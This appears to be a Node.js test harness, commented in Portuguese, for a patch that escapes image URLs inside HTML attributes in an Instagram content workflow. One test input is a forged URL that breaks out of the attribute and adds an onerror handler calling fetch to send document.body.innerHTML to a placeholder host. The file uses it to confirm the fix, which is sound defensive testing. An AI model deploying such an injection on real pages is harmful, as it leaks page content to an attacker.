// Harness da blindagem de atributo nas URLs de imagem. Offline.
//
// O que precisa provar — e a primeira é a que autoriza o deploy:
//
//   1. URL LEGÍTIMA NÃO MUDA UM BYTE. A blindagem entra no caminho de toda imagem de toda peça;
//      se ela alterar uma URL válida, a arte quebra em produção e o conserto vira o problema.
//      Medido contra as URLs reais da amostra versionada, uma a uma, antes × depois.
//   2. URL forjada com aspas deixa de escapar do atributo — é a fuga que a auditoria achou.
//   3. O atalho do Mux continua preservando `&` e o parâmetro de largura.
//   4. A ponte de imagem (20/09) continua intacta: a blindagem entrou no mesmo `cloud()`.
//   5. Os três nós recebem a MESMA função, e o ida-e-volta devolve o byte original.
//
//   node design/test_url_attr.cjs
const fs = require('fs');
const path = require('path');
const { aplicarNo, lf, MARCA } = require('./patch_url_attr.cjs');

const WFDIR = path.join(__dirname, '..', 'workflows', 'promoliso-conteudo-instagram--NL8eVLKErgnIXBQq');
const AMOSTRA = path.join(__dirname, 'fila_amostra_20260820.json');
const ARQUIVOS = {
  'Code in JavaScript': 'code-in-javascript.js',
  'Code in JavaScript1': 'code-in-javascript1.js',
  'Usar capa como fallback': 'usar-capa-como-fallback.js',
};

let falhas = 0;
const ok = (nome, cond, detalhe) => {
  console.log((cond ? 'PASS  ' : 'FALHA ') + nome + (cond || !detalhe ? '' : '  -> ' + detalhe));
  if (!cond) falhas += 1;
};

// Fatia a função do nó e a executa — sem reimplementar nada.
function extrair(codigo, nome) {
  const i = codigo.indexOf('function ' + nome + '(');
  if (i < 0) return null;
  let nivel = 0;
  for (let k = codigo.indexOf('{', i); k < codigo.length; k += 1) {
    if (codigo[k] === '{') nivel += 1;
    else if (codigo[k] === '}') {
      nivel -= 1;
      if (nivel === 0) {
        const corpo = codigo.slice(i, k + 1);
        const urlattr = codigo.includes(MARCA)
          ? codigo.slice(codigo.indexOf(MARCA), codigo.indexOf('}', codigo.indexOf('padStart(2,\'0\')')) + 1)
          : '';
        // eslint-disable-next-line no-new-func
        return new Function(`${urlattr}\n${corpo}\nreturn ${nome};`)();
      }
    }
  }
  return null;
}

// ── URLs reais da amostra ───────────────────────────────────────────────────
const amostra = JSON.parse(fs.readFileSync(AMOSTRA, 'utf8'));
const urlsReais = [];
for (const r of amostra) {
  try { urlsReais.push(...JSON.parse(r.carousel_urls || '[]')); } catch (e) { /* row sem carrossel */ }
  if (r.story_url) urlsReais.push(r.story_url);
}
// além das já renderizadas (Cloudinary), as URLs de origem que passam pelos atalhos
const ORIGENS = [
  'https://res.cloudinary.com/fy2n2qvr/image/upload/v1789570897/ijg9phpzidoymtkkwe0n.jpg',
  'https://image.mux.com/abc123/thumbnail.jpg?token=eyJhbGciOiJIUzI1NiJ9&time=12',
  'https://xboxwire.thesourcemediaassets.com/sites/2/2026/09/x-scaled.jpg',
  'https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1/ss_x.1920x1080.jpg?t=123',
  'https://www.adrenaline.com.br/wp-content/uploads/2026/09/x.jpeg',
  'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AAA/s1920/capa.png',
];

for (const [no, arquivo] of Object.entries(ARQUIVOS)) {
  const texto = lf(fs.readFileSync(path.join(WFDIR, arquivo), 'utf8'));
  const jaTem = texto.includes(MARCA);
  const novo = jaTem ? texto : aplicarNo(texto, no, false);
  const antigo = jaTem ? aplicarNo(texto, no, true) : texto;
  const ehFallback = no === 'Usar capa como fallback';
  const fnNova = extrair(novo, ehFallback ? 'safeImage' : 'cloud');
  const fnVelha = extrair(antigo, ehFallback ? 'safeImage' : 'cloud');
  ok(`${no}: funções encontradas`, typeof fnNova === 'function' && typeof fnVelha === 'function');
  if (typeof fnNova !== 'function') continue;
  const chamar = (fn, u) => (ehFallback ? fn(u) : fn(u, 'f_auto'));

  // 1. nenhuma URL real pode mudar
  const todas = [...new Set([...urlsReais, ...ORIGENS])];
  const mudaram = todas.filter((u) => chamar(fnVelha, u) !== chamar(fnNova, u));
  ok(`${no}: ${todas.length} URLs reais passam byte a byte iguais`, mudaram.length === 0, mudaram[0]);

  // 2. a fuga fecha
  const forjada = 'https://res.cloudinary.com/fy2n2qvr/a" onerror="fetch(\'http://x/\'+document.body.innerHTML)';
  const antes = chamar(fnVelha, forjada);
  const depois = chamar(fnNova, forjada);
  ok(`${no}: antes a URL forjada saía com aspas cruas`, antes.includes('"'));
  ok(`${no}: agora não escapa do atributo`, !depois.includes('"') && !depois.includes('<') && !depois.includes('>'),
    depois.slice(0, 90));

  // 3. o atalho do Mux preserva querystring
  const mux = chamar(fnNova, 'https://image.mux.com/abc/thumbnail.jpg?token=xyz');
  ok(`${no}: Mux mantém & e a largura`, mux.includes('token=xyz') && /width=\d+/.test(mux), mux.slice(0, 80));

  // 4. a ponte de 20/09 segue de pé (só nos builders, o fallback tem a sua)
  const ponte = chamar(fnNova, 'https://www.adrenaline.com.br/wp-content/uploads/2026/09/x.jpeg');
  ok(`${no}: host bloqueado continua indo pela ponte`, decodeURIComponent(ponte).includes('/img?u='), ponte.slice(0, 80));

  // 5. ida e volta
  ok(`${no}: reverter e reaplicar volta byte a byte`, aplicarNo(aplicarNo(novo, no, true), no, false) === lf(novo));
  let compila = true;
  try { new Function(novo); } catch (e) { compila = false; }
  ok(`${no}: jsCode resultante compila`, compila);
}

console.log('');
console.log(falhas ? `${falhas} FALHA(S)` : 'TUDO PASSOU');
process.exit(falhas ? 1 : 0);
